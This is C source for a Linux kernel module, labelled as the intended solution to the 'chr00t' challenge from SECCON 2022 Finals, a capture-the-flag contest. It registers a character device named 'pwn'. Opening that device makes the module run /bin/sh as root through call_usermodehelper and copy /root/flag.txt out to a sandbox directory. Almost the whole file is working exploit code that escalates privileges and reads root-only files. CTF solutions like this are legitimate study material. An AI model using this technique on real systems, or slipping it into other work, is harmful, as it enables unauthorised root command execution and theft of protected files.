#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/cdev.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/random.h>
#include <asm/uaccess.h>

#define DEVICE_NAME "pwn"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("ptr-yudai");
MODULE_DESCRIPTION("Intended Solution for chr00t - SECCON 2022 Finals");

static int module_open(struct inode *inode, struct file *file) {
  int ret;
  char userprog[] = "/bin/sh";
  char *argv[] = {
    userprog, "-c",
    "/bin/cat /root/flag.txt > /sandbox/flag.txt", NULL
  };
  char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL };
  ret = call_usermodehelper(userprog, argv, envp, UMH_WAIT_EXEC);
  if (ret != 0)
    printk("pwn: failed with %d\n", ret);
  else
    printk("pwn: success\n");
  return 0;
}

static struct file_operations module_fops = {
  .owner = THIS_MODULE,
  .open  = module_open,
};

static int __init module_initialize(void) {
  register_chrdev(60, DEVICE_NAME, &module_fops);
  return 0;
}

static void __exit module_cleanup(void) {
  unregister_chrdev(60, DEVICE_NAME);
}

module_init(module_initialize);
module_exit(module_cleanup);
